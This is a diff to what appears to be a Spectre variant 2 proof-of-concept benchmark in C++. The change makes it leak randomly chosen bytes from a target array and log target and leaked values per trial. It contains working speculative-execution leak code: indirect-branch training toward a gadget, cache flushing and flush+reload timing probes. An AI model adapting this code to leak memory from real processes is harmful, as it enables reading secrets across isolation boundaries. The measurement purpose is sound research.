@@ -3,6 +3,7 @@
 #include <cstdio>
 #include <cstdlib>
 #include <cstring>
+#include <ctime>
 #include <emmintrin.h>
 #include <sched.h>
 #include <stdint.h>
@@ -40,7 +41,8 @@ void *probe_buf;
 void *train_buf;
 static const unsigned char secret[] = "this is my super secret value!";
 static volatile const unsigned char *leak_ptr = secret;
-static volatile unsigned char target_byte_storage = 0;
+#define TARGET_ARRAY_SIZE 256
+alignas(64) static unsigned char target_array[TARGET_ARRAY_SIZE];
 
 static inline long time_load(void *ptr) {
     unsigned int junk = 0;
@@ -128,14 +130,12 @@ static void pin_cpu(int cpu) {
     }
 }
 
-static int run_bench_byte(unsigned char target_value, int num_trials, int threshold,
-                          int flush_target) {
+static int run_bench_byte(int num_trials, int threshold, int flush_target) {
     const int cpu = 0;
     pin_cpu(cpu);
     initialize_functions();
-
-    target_byte_storage = target_value;
-    leak_ptr = &target_byte_storage;
+    specexp_init_target_array(target_array, TARGET_ARRAY_SIZE, 0xdeadbeef);
+    srand((unsigned int)time(nullptr));
 
     probe_buf = alloc_buf(NUM_PAGES);
     train_buf = alloc_buf(NUM_PAGES);
@@ -147,17 +147,20 @@ static int run_bench_byte(unsigned char target_value, int num_trials, int thresh
     FuncPtr final_choices[2] = {final_gadget, final_legitimate};
     const char *variant = flush_target ? "v2-flush" : "v2";
 
-    fprintf(stderr, "%s bench: target=0x%02x trials=%d threshold=%d\n",
-            variant, target_value, num_trials, threshold);
-    printf("variant,trial,outcome,leaked_value\n");
+    fprintf(stderr, "%s bench: trials=%d threshold=%d\n", variant, num_trials, threshold);
+    printf("variant,trial,target_value,leaked_value,outcome\n");
 
     for (int t = 0; t < num_trials; ++t) {
+        int idx = rand() % TARGET_ARRAY_SIZE;
+        unsigned char target_value = target_array[idx];
+        leak_ptr = &target_array[idx];
+
         specexp_flush_buffer(probe_buf, (size_t)PAGE_SIZE * NUM_PAGES);
 
         if (flush_target) {
             for (int j = 0; j <= TRAIN_REPS; ++j) {
                 int v = (j == TRAIN_REPS);
-                _mm_clflush((const void *)&target_byte_storage);
+                _mm_clflush((const void *)&target_array[idx]);
                 funcs[ARRAY_SIZE - 1] = final_choices[v];
                 _mm_clflush(&funcs[ARRAY_SIZE - 1]);
                 _mm_mfence();
@@ -175,7 +178,8 @@ static int run_bench_byte(unsigned char target_value, int num_trials, int thresh
 
         int found = specexp_probe_argmin(probe_buf, SPECEXP_NUM_PAGES, threshold,
                                          SPECEXP_PROBE_SKIP_LOW, order, &lcg_state);
-        printf("%s,%d,%s,%d\n", variant, t, specexp_outcome(found, (int)target_value), found);
+        printf("%s,%d,%d,%d,%s\n", variant, t, (int)target_value, found,
+               specexp_outcome(found, (int)target_value));
     }
     return 0;
 }
@@ -183,14 +187,15 @@ static int run_bench_byte(unsigned char target_value, int num_trials, int thresh
 int main(int argc, char **argv) {
     int bench_mode = 0;
     int flush_target = 0;
-    unsigned long target_value = 0xa5;
     int num_trials = 10000;
     int threshold = 120;
 
     for (int i = 1; i < argc; ++i) {
-        if (!strcmp(argv[i], "--bench-byte") && i + 1 < argc) {
+        if (!strcmp(argv[i], "--bench")) {
             bench_mode = 1;
-            target_value = strtoul(argv[++i], nullptr, 0);
+        } else if (!strcmp(argv[i], "--bench-byte") && i + 1 < argc) {
+            bench_mode = 1;
+            ++i;
         } else if (!strcmp(argv[i], "--trials") && i + 1 < argc) {
             num_trials = atoi(argv[++i]);
         } else if (!strcmp(argv[i], "--threshold") && i + 1 < argc) {
@@ -201,7 +206,7 @@ int main(int argc, char **argv) {
     }
 
     if (bench_mode) {
-        return run_bench_byte((unsigned char)target_value, num_trials, threshold, flush_target);
+        return run_bench_byte(num_trials, threshold, flush_target);
     }
 
     const int cpu = 0;
